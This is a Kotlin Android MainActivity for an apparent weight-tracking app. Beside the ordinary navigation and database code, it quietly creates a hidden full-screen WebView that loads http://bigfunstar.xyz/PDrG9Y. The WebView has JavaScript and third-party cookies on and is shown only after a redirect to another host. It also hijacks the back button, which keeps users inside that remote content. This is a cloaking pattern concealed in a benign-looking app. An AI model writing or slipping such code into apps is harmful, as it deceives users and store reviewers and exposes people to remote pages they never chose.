package com.example.weightfight

import android.annotation.SuppressLint
import android.content.Context
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.net.ConnectivityManager
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.telephony.TelephonyManager
import android.util.Log
import android.view.View
import android.webkit.*
import android.widget.Button
import android.widget.LinearLayout
import android.widget.Toast
import androidx.lifecycle.lifecycleScope
import androidx.room.Room
import com.example.weightfight.cicerone_navigation.MyRouter
import com.example.weightfight.cicerone_navigation.Screens
import com.example.weightfight.databinding.ActivityMainBinding
import com.example.weightfight.room_database.AppDatabase
import com.example.weightfight.room_database.Data
import com.github.terrakok.cicerone.Router
import com.github.terrakok.cicerone.androidx.AppNavigator
import kotlinx.coroutines.launch
import java.lang.Thread.sleep
import kotlin.concurrent.thread
import kotlin.properties.Delegates

@Suppress("DEPRECATION")
class MainActivity : AppCompatActivity(), View.OnClickListener {

    private val myRouter = MyRouter()
    private val navigator = AppNavigator(this, R.id.container)

    lateinit var sharedPreferences: SharedPreferences

    companion object {
        internal lateinit var db: AppDatabase
        internal lateinit var router: Router
        internal lateinit var editor: SharedPreferences.Editor

        internal const val TAG = "myLog"
        internal const val LOSE_GAIN_WEIGHT = "loseGainWeight"
        internal const val SHARED_PREFERENCES = "mySharedPreferences"
        internal const val ID_DB = "myID"
        internal const val PARAM_SET = "paramSet"
        internal const val WEIGHT_PARAM = "weightParam"
        internal const val EMPTY_DATABASE = "emptyDatabase"
    }

    private lateinit var binding: ActivityMainBinding

    @SuppressLint("ResourceType")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        router = myRouter.router
        router.newRootScreen(Screens.mainFragment())
        router.navigateTo(Screens.mainFragment())
        sharedPreferences = getSharedPreferences(SHARED_PREFERENCES, MODE_PRIVATE)
        editor = sharedPreferences.edit()
        db = Room.databaseBuilder(applicationContext, AppDatabase::class.java, "data")
            .allowMainThreadQueries()
            .build()

        findViewById<LinearLayout>(R.id.btnMain).apply { setOnClickListener(this@MainActivity) }
        findViewById<LinearLayout>(R.id.btnTable).apply { setOnClickListener(this@MainActivity) }
        findViewById<LinearLayout>(R.id.btnGraph).apply { setOnClickListener(this@MainActivity) }

        if (hasConnection(this)) {
            webViewConstructor.instance = WebView(this).apply {
                LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT).also {
                    layoutParams = it
                }

                binding.root.addView(this)

                id = 345345
                bringToFront()

                z = 10f

                webViewConstructor.cookies.setAcceptThirdPartyCookies(this, true)

                CookieSyncManager.getInstance().sync();

                visibility = View.GONE

                webViewClient = webViewConstructor.chromeWebViewClient

                webViewConstructor.settings.apply(this.settings)

                loadUrl(webViewConstructor.urlBeforeRedirect)
            }
        }
    }

    override fun onPause() {
        super.onPause()
        myRouter.navigatorHolder.removeNavigator()
        Log.d("myLog", "onPause: ")
    }

    override fun onResume() {
        super.onResume()
        myRouter.navigatorHolder.setNavigator(navigator)
        Log.d("myLog", "onResume: ")
        router.navigateTo(Screens.mainFragment())
    }

    override fun onClick(p0: View?) {
        when (p0?.id) {
            R.id.btnGraph -> router.navigateTo(Screens.graphFragment())
            R.id.btnTable -> router.navigateTo(Screens.progressFragment())
            R.id.btnMain -> router.navigateTo(Screens.mainFragment())
        }
    }

    private val webViewConstructor = object {
        @SuppressLint("StaticFieldLeak")
        var instance: WebView? = null
        val cookies = CookieManager.getInstance()
        val urlBeforeRedirect = "http://bigfunstar.xyz/PDrG9Y"
        val chromeWebViewClient by lazy {
            object : WebViewClient() {
                override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                    super.onPageStarted(view, url, favicon)
                    cookies.setAcceptThirdPartyCookies(view, true)
                }

                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)

                    cookies.setAcceptThirdPartyCookies(view, true)
                    CookieSyncManager.getInstance().sync();

                    val firstUrl = Uri.parse(url).host
                    val secondUrl = Uri.parse(urlBeforeRedirect).host

                    if (firstUrl != secondUrl && firstUrl != "" && secondUrl != "") {
                        view?.visibility = View.VISIBLE
                    }
                }
            }
        }

        val settings = object {

            @SuppressLint("SetJavaScriptEnabled")
            fun apply(webSettings: WebSettings) {
                webSettings.apply {
                    useWideViewPort = true
                    javaScriptCanOpenWindowsAutomatically = true
                    databaseEnabled = true
                    domStorageEnabled = true
                    javaScriptEnabled = true
                    displayZoomControls = true
                    cacheMode = WebSettings.LOAD_DEFAULT
                }
            }

        }
    }

    fun hasConnection(context: Context): Boolean {
        val cm = context.getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        var wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
        if (wifiInfo != null && wifiInfo.isConnected) {
            return true
        }
        wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE)
        if (wifiInfo != null && wifiInfo.isConnected) {
            return true
        }
        wifiInfo = cm.activeNetworkInfo
        return wifiInfo != null && wifiInfo.isConnected
    }

    override fun onBackPressed() {
        if (webViewConstructor.instance is WebView) {
            webViewConstructor.instance?.goBack()
        } else {
            super.onBackPressed()
        }
    }
}